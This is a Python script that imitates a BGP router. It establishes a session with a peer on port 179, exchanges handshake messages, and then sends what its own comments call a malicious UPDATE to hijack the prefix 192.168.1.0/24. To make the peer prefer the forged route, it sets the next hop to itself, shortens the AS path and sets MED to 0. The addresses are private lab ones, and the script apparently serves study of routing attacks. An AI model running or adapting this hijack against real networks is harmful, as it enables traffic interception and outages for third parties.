"""
Mimics a BGP router establishing a BGP session with a peer, doing the appropriate handshake, and sending BGP updates.
It then builds a BGP UPDATE message to hijack a route and sends it to the peer.
"""
from transport import TCPTransportClient
from bgp_messages import BGPUpdate, BGPNotification, BGPKeepAlive, BGPOpen, parse_bytes
from fields import IntField, StringField, ListField, LengthField, Field, MetaField
from bgp_fields import (
    IPv4AddressField,
    PathAttribute,
    Origin,
    ASPath,
    NextHop,
    MultiExitDisc,
    LocalPref,
    NetworkLayerReachabilityInformation,
    Capability,
    MultiprotocolExtensions,
    RouteRefresh,
    BGPExtended,
    GracefulRestart,
    FourOctetASNumber,
    Dynamic,
    AdditionalPaths,
    EnhancedRouteRefresh,
    LongLivedGracefulRestart,
    FQDN,
    SoftwareVersion,
    PathsLimit,
    OptionalParameter,
    BGPHeader,
)

import socket
import threading

from enum import Enum
from time import sleep


COMMON_CAPABILITIES = [
    MultiprotocolExtensions(1, 1),
    RouteRefresh(),
    EnhancedRouteRefresh(),
    BGPExtended(),
    AdditionalPaths(1, 1, True),
    PathsLimit(0x0001010000),
    Dynamic(),
    GracefulRestart(False, True, 120),
    LongLivedGracefulRestart(0x00010180000000),
]


def verify_message_type(message: BGPNotification | BGPOpen | BGPKeepAlive | BGPUpdate, expected_type) -> None:
    if not isinstance(message, expected_type):
        raise ValueError(f'Expected `{expected_type.__name__}` message. Instead received a `{message.__class__.__name__}` message.\nRaw Message: {message.to_bytes()}\nParsed Message: {message}')


class BGPSessionInfo:
    def __init__(self, marker: int, hold_time: int, keepalive_time: int, asn_size: int) -> None:
        self.marker = marker
        self.hold_time = hold_time
        self.keepalive_time = keepalive_time
        self.asn_size = asn_size


class BGPRouteInfo:
    def __init__(self, origin: int = None, network_address: str = None, network_prefix: str = None, next_hop: str = None, as_path: list[int] = None, med: int = None, local_pref: int = None) -> None:
        self.origin = origin
        self.network_address = network_address
        self.network_prefix = network_prefix
        self.next_hop = next_hop
        self.as_path = as_path
        self.med = med
        self.local_pref = local_pref

    def __eq__(self, o: object) -> bool:
        if not isinstance(o, BGPRouteInfo):
            return False
        # Check that all fields are equal
        return all(getattr(self, field) == getattr(o, field) for field in self.__dict__.keys())

    def __hash__(self) -> int:
        return hash((self.origin, self.network_address, self.network_prefix, self.next_hop, tuple(self.as_path), self.med))


class BGPPeer:
    '''
    Represents a BGP peer.
    '''
    class State(Enum):
        '''
        State descriptions: https://en.wikipedia.org/wiki/Border_Gateway_Protocol

        Currently unused
        '''
        IDLE = 1
        CONNECT = 2
        ACTIVE = 3
        OPENSENT = 4
        OPENCONFIRM = 5
        ESTABLISHED = 6

    def __init__(self, hostname: str, domain_name: str, software_version: str, ip_address: str, asn: int, hold_time: int, bgp_version=4, marker=0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF, four_byte_asn: bool = True, routes: list[BGPRouteInfo] = None) -> None:
        self.ip_address = ip_address
        self.asn = asn
        self.hold_time = hold_time
        self.bgp_version = bgp_version
        self.marker = marker
        self.four_byte_asn = four_byte_asn

        capabilities = list(COMMON_CAPABILITIES)
        if four_byte_asn:
            capabilities.append(FourOctetASNumber(self.asn))
        if hostname is not None or domain_name is not None:
            hostname = hostname if hostname else ''
            domain_name = domain_name if domain_name else ''
            capabilities.append(FQDN(hostname, domain_name))
        if software_version is not None:
            capabilities.append(SoftwareVersion(software_version))
        self.opt_param_capabilities = [OptionalParameter(2) for _ in range(len(capabilities))]
        for i, capability in enumerate(capabilities):
            self.opt_param_capabilities[i].set_capability(capability)

        self.routes = routes
        if self.routes is None:
            self.routes = []

        self.sessions: list[BGPSession] = []

    def __eq__(self, o: object) -> bool:
        return isinstance(o, BGPPeer) and self.ip_address == o.ip_address and self.asn == o.asn

    def __hash__(self) -> int:
        return hash((self.ip_address, self.asn))

    def create_open(self) -> BGPOpen:
        open_message = BGPOpen(self.bgp_version, self.ip_address, self.asn, self.hold_time)
        open_message.optional_parameters.extend(self.opt_param_capabilities)
        return open_message

    def create_keepalive(self) -> BGPKeepAlive:
        return BGPKeepAlive()

    def create_notification(self, major_error: int, minor_error: int) -> BGPNotification:
        return BGPNotification(major_error, minor_error)

    def create_update(self, session: 'BGPSession', route_info: BGPRouteInfo) -> BGPUpdate:
        update_message = BGPUpdate(marker=session.session_info.marker)
        attributes = []

        # if NLRI info is set
        if route_info.network_address is not None or route_info.network_prefix is not None:
            # all NLRI info must be set
            if not (bool(route_info.network_address) and bool(route_info.network_prefix)):
                raise ValueError('Network Address and Prefix must be set for BGPUpdate with NLRI.')
            # set NLRI
            nlri = NetworkLayerReachabilityInformation(route_info.network_address, route_info.network_prefix)
            update_message.set_nlri(nlri)
            # origin, as_path, and next_hop must be set.
            if route_info.origin is None:
                raise ValueError('Origin must be set for BGPUpdate with NLRI.')
            if route_info.as_path is None:
                raise ValueError('AS Path must be set for BGPUpdate with NLRI.')
            if route_info.next_hop is None:
                raise ValueError('Next Hop must be set for BGPUpdate with NLRI.')

            origin = Origin(0x40, route_info.origin)
            as_path = ASPath(0x50, session.session_info.asn_size, route_info.as_path)
            next_hop = NextHop(0x40, route_info.next_hop)
            attributes.extend([origin, as_path, next_hop])
            if route_info.med is not None:
                med = MultiExitDisc(0x80, route_info.med)
                attributes.append(med)
            if route_info.local_pref is not None:
                local_pref = LocalPref(0x40, route_info.local_pref)
                attributes.append(local_pref)

        update_message.path_attributes.extend(attributes)
        return update_message

    def create_updates(self, session) -> list[BGPUpdate]:
        if not self.routes:
            route_info = BGPRouteInfo()
            return [self.create_update(session, route_info)]

        updates = []
        for route_info in self.routes:
            updates.append(self.create_update(session, route_info))
        return updates

    def connect(self, remote_ip: str, local_address: str = None, local_port: int = None) -> 'BGPSession':
        '''
        Attempts to establish a BGP session with the given remote IP address.

        This requires BGP to be running at the remote IP address and for that
        BGP instance to be configured to accept connections from this peer IP address.

        Once the BGP session is established, the session is stored in the `sessions` list.
        '''
        # Establish TCP connection
        session_transport = TCPTransportClient()
        session_transport.connect(remote_ip, 179, local_address, local_port)

        # Exchange BGPOpen messages
        peer_msg1_bytes = session_transport.sendrecv(self.create_open().to_bytes())
        parsed_msg1 = parse_bytes(peer_msg1_bytes)[0]
        verify_message_type(parsed_msg1, BGPOpen)
        peer_open_msg: BGPOpen = parsed_msg1

        # Parse open message to establish session and peer object
        peer_marker = peer_open_msg.header.marker.value
        peer_hold_time = peer_open_msg.hold_time.value
        peer_ip = peer_open_msg.bgp_id.value
        peer_asn = peer_open_msg.my_as.value
        has_four_byte_asn = any(isinstance(opt_param.capability, FourOctetASNumber) for opt_param in peer_open_msg.optional_parameters.value)
        if has_four_byte_asn:
            peer_asn = next(opt_param.capability.asn for opt_param in peer_open_msg.optional_parameters.value if isinstance(opt_param.capability, FourOctetASNumber)).value
        peer_has_software_version = any(isinstance(opt_param.capability, SoftwareVersion) for opt_param in peer_open_msg.optional_parameters.value)
        peer_software_version = None
        if peer_has_software_version:
            peer_software_version = next(opt_param.capability.software_version.value for opt_param in peer_open_msg.optional_parameters.value if isinstance(opt_param.capability, SoftwareVersion))
        peer_has_fqdn = any(isinstance(opt_param.capability, FQDN) for opt_param in peer_open_msg.optional_parameters.value)
        peer_hostname = None
        peer_domain_name = None
        if peer_has_fqdn:
            fqdn = next(opt_param.capability for opt_param in peer_open_msg.optional_parameters.value if isinstance(opt_param.capability, FQDN))
            peer_hostname = fqdn.hostname
            peer_domain_name = fqdn.domain_name

        bgp_peer = BGPPeer(peer_hostname, peer_domain_name, peer_software_version, peer_ip, peer_asn, peer_hold_time, marker=peer_marker, four_byte_asn=has_four_byte_asn)
        bgp_session = BGPSession(session_transport, self, bgp_peer, marker=peer_marker)

        # Exchange BGPKeepAlive messages
        parsed_msg2 = bgp_session.recv()[0]
        verify_message_type(parsed_msg2, BGPKeepAlive)
        bgp_session.send(self.create_keepalive())

        # Exchange BGPUpdate messages
        update_messages: list[BGPUpdate] = self.create_updates(bgp_session)
        parsed_msg3 = bgp_session.sendrecv(update_messages)
        for msg in parsed_msg3:
            verify_message_type(msg, BGPUpdate)

        peer_update_msgs: BGPUpdate = parsed_msg3

        # Parse update messages to determine peer routes
        for update_msg in peer_update_msgs:
            route_info = BGPRouteInfo()
            if update_msg.nlri is None:
                continue

            route_info.network_address = update_msg.nlri.address.value
            route_info.network_prefix = update_msg.nlri.prefix_length.value
            for attr in update_msg.path_attributes.value:
                if isinstance(attr, Origin):
                    route_info.origin = attr.origin
                elif isinstance(attr, ASPath):
                    route_info.as_path = [asn.value for asn in attr.asns.value]
                elif isinstance(attr, NextHop):
                    route_info.next_hop = attr.next_hop
                elif isinstance(attr, MultiExitDisc):
                    route_info.med = attr.med
                elif isinstance(attr, LocalPref):
                    route_info.local_pref = attr.local_pref
            bgp_session.bgp_peer.routes.append(route_info)

        # Exchange BGPKeepAlive messages again
        parsed_msg4 = bgp_session.recv()[0]
        verify_message_type(parsed_msg4, BGPKeepAlive)
        bgp_session.send(self.create_keepalive())

        self.sessions.append(bgp_session)
        bgp_session.start()
        return bgp_session


class BGPSession:
    def __init__(self, transport: TCPTransportClient, bgp_local: BGPPeer, bgp_peer: BGPPeer, marker=0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF) -> None:
        self.bgp_local = bgp_local
        self.bgp_peer = bgp_peer
        self.transport = transport
        hold_time = min(bgp_local.hold_time, bgp_peer.hold_time)
        keepalive_time = hold_time // 3
        asn_size = 4 if bgp_local.four_byte_asn and bgp_peer.four_byte_asn else 2
        self.session_info = BGPSessionInfo(marker, hold_time, keepalive_time, asn_size)
        self.keepalive_thread = None
        self.recv_thread = None

    def send_raw(self, data: bytes) -> None:
        self.transport.send(data)

    def recv_raw(self) -> bytes:
        return self.transport.recv()

    def sendrecv_raw(self, data: bytes) -> bytes:
        self.send_raw(data)
        return self.recv_raw()

    def send(self, message: list[BGPKeepAlive | BGPOpen | BGPUpdate | BGPNotification] | BGPKeepAlive | BGPOpen | BGPUpdate | BGPNotification) -> None:
        data = b''
        if isinstance(message, list):
            for msg in message:
                data += msg.to_bytes()
        else:
            data += message.to_bytes()
        self.transport.send(data)

    def recv(self) -> list[BGPKeepAlive | BGPOpen | BGPUpdate | BGPNotification]:
        return parse_bytes(self.transport.recv())

    def sendrecv(self, bgp_messages: list[BGPKeepAlive | BGPOpen | BGPUpdate | BGPNotification] | BGPKeepAlive | BGPOpen | BGPUpdate | BGPNotification) -> list[BGPKeepAlive | BGPOpen | BGPUpdate | BGPNotification]:
        self.send(bgp_messages)
        return self.recv()

    def close(self):
        self.transport.close()
        self.keepalive_thread = None
        self.recv_thread = None

    def start(self, callback=None):
        if self.keepalive_thread is not None or self.recv_thread is not None:
            raise RuntimeError('Session already started.')
        self.keepalive_thread = threading.Thread(target=self.__keepalive_loop)
        self.keepalive_thread.start()
        if callback is not None:
            self.recv_thread = threading.Thread(target=self.__recv_loop, args=(callback, ))
            self.recv_thread.start()

    def __recv_loop(self, callback):
        while self.transport.socket is not None:
            data = self.recv()
            if data:
                callback(data)

    def __keepalive_loop(self):
        while self.transport.socket is not None:
            self.send(self.bgp_local.create_keepalive())
            sleep(self.session_info.keepalive_time)


def main():
    bgp_session = None
    try:
        # Create local BGP instance
        local_address = '192.168.0.1'
        local_asn = 64510
        local_hostname = 'H-1'
        local_domain_name = ''
        local_hold_time = 15
        local_software_version = 'FRRouting/10.1.1'
        local_peer = BGPPeer(local_hostname, local_domain_name, local_software_version, local_address, local_asn, local_hold_time)

        # Connect and establish BGP session with remote BGP peer
        remote_peer_address = '192.168.0.254'
        print(f'Connecting to remote BGP peer at {remote_peer_address} and establishing BGP session...', end=' ', flush=True)
        bgp_session = local_peer.connect(remote_peer_address)
        print('Done.')

        # Print routes learned from peer
        print(f'Routes learned from peer {bgp_session.bgp_peer.ip_address} with ASN {bgp_session.bgp_peer.asn}:')
        for route in bgp_session.bgp_peer.routes:
            print(f'\t{route.network_address}/{route.network_prefix} via {route.next_hop.value} with AS Path {route.as_path}')
        print()

        # Give time for BGP session to establish and a few keepalives to be exchanged
        sleep(16)

        # Build malicious BGP Update message to hijack a route
        route_origin = 0 # IGP
        route_network_address = '192.168.1.0' # Route network address
        route_network_prefix = 24 # Route address network prefix
        route_next_hop = local_peer.ip_address # Set next hop of the route to local peer. Says NLRI is reachable through local peer.
        route_as_path = [local_peer.asn] # say route is directly connected to local peer, help ensure shortest path
        route_med = 0 # Set Multi Exit Discriminator to 0, to ensure route is preferred
        route_info = BGPRouteInfo(route_origin, route_network_address, route_network_prefix, route_next_hop, route_as_path, route_med)

        # Send malicious BGP Update message to peer
        malicious_bgp_update_message = local_peer.create_update(bgp_session, route_info)
        remote_peer_response = bgp_session.sendrecv(malicious_bgp_update_message)
        for msg in remote_peer_response:
            if isinstance(msg, BGPNotification):
                raise IOError(f"BGP Peer responded with a BGP Notification error message.\n{msg}")

        print(f'Malicious BGP Update message sent to peer {bgp_session.bgp_peer.ip_address} with ASN {bgp_session.bgp_peer.asn}.')
        print('Main thread going to sleep for a while...')
        sleep(3600)
    except Exception as e:
        print(f'Error occurred: {e}')
    finally:
        print('Closing BGP session...')
        bgp_session.close()
        print('BGP session closed.')


if __name__ == '__main__':
    main()
